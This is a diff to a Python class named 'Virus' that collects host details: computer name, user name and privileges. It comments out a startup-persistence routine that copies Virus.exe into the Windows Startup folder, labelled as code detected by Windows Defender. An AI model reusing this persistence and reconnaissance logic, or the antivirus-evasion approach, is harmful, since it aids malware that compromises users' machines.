@@ -6,6 +6,9 @@ import time
 import shutil
 
 
+"""
+Class designed to grab information about the host machine
+"""
 class Virus:
 
 
@@ -96,13 +99,16 @@ class Virus:
 
         print(self.informations)
     
-
-    def ensureRunAtStartup(self):
-
-        pass
+    
+    # Code detected by Windows Defender --------------------------------------------------------------
+    
+    #def ensureRunAtStartup(self):
+ 
         #if os.getcwd() is not "C:\\Users\\" + self.userName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup":
 
         #    shutil.copy(os.getcwd() + "\\Virus.exe", "C:\\Users\\" + self.userName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Virus.exe")
+    
+    # ------------------------------------------------------------------------------------------------
     
 
 
@@ -115,8 +121,6 @@ class Virus:
         self.obtainComputerName()
         self.obtainUserName()
         self.obtainUserPrivileges()
-
-        #self.ensureRunAtStartup()
 
 
 """
